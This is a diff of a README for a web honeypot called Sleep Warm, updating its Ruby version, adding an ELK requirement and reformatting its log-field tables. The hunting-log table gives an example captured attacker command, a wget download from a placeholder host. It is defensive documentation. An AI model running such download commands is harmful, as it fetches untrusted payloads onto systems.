@@ -15,7 +15,7 @@ A web-based low-interaction honeypot build on [Rack](https://github.com/rack/rac
 
 ## Supported
 
-- Ubuntu 16.04 LTS and Ruby 2.4.
+- Ubuntu 16.04 LTS and Ruby 2.5.
 
 ## Installation
 
@@ -25,6 +25,8 @@ You will need:
 
 - Ruby
 - [Itamae](http://itamae.kitchen/)
+- An ELK stack for log analysis
+  -
 
 ### How to install
 
@@ -42,7 +44,6 @@ And then the honeypot works as `sleep-warm.service` on `80/tcp` and `9292/tcp`.
 ## Directory structure
 
 - `/opt/sleep-warm`: The main directory of the honeypot.
-- `/var/log/sleep-warm`: The log directory of the honeypot.
 
 ### Matching rules
 
@@ -79,35 +80,26 @@ Sleep Warm outputs 3 types of logs.
 
 - Access log to the honeypot.
 
-|key|desc.|e.g.|
-|---|---|---|
-|http_timestamp|Timestamp of a HTTP request|`[2018-05-01T22:57:32+00:00]`|
-|client_ip|Client IP|`10.0.2.2`|
-|hostname|Hostname|`localhost:9292`|
-|method|HTTP method|`GET`|
-|uri|Request URI|`http://localhost:9292`|
-|http_version|HTTP version|`HTTP/1.1`|
-|status|Status code|`200`|
-|rule_id|Matched rule id|`1001`|
-|all|Base64 encoded HTTP request|-|
-
-- e.g. `[2018-05-02T10:46:32+09:00] 127.0.0.1 localhost:9292 "GET http://localhost:9292/ HTTP/1.1" 200 None R0VUIGh0dHA6Ly9sb2NhbGhvc3Q6OTI5Mi8KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicgpBY2NlcHQtTGFuZ3VhZ2U6IGVuLGphO3E9MC45LGVuLVVTO3E9MC44CkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOApDb25uZWN0aW9uOiBrZWVwLWFsaXZlCkRudDogMQpIb3N0OiBsb2NhbGhvc3Q6OTI5MgpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzEzXzQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS82NS4wLjMzMjUuMTgxIFNhZmFyaS81MzcuMzYKVmVyc2lvbjogSFRUUC8xLjE=`
+| key          | desc.                       | e.g.                    |
+|:-------------|:----------------------------|:------------------------|
+| client_ip    | Client IP                   | `10.0.2.2`              |
+| hostname     | Hostname                    | `localhost:9292`        |
+| method       | HTTP method                 | `GET`                   |
+| uri          | Request URI                 | `http://localhost:9292` |
+| http_version | HTTP version                | `HTTP/1.1`              |
+| status       | Status code                 | `200`                   |
+| rule_id      | Matched rule id             | `1001`                  |
+| all          | Base64 encoded HTTP request | -                       |
 
 #### Hunting log
 
 - Hunting log to the honeypot.
 
-|key|desc.|e.g.|
-|---|---|---|
-|http_timestamp|Timestamp of a HTTP request|`[2018-05-06T12:34:44+09:00]`|
-|client_ip|Client IP|`10.0.2.2`|
-|commands|Commands which try to download something|`wget http://example.com/hoge.bin`|
+| key       | desc.                                    | e.g.                               |
+|:----------|:-----------------------------------------|:-----------------------------------|
+| client_ip | Client IP                                | `10.0.2.2`                         |
+| commands  | Commands which try to download something | `wget http://example.com/hoge.bin` |
 
-- e.g. `[2018-05-06T12:34:44+09:00] 10.0.2.2 wget http://example.com/hoge.bin`
-
-#### Application log
-
-- Application log of the honeypot.
 
 ## Default UFW settings
 
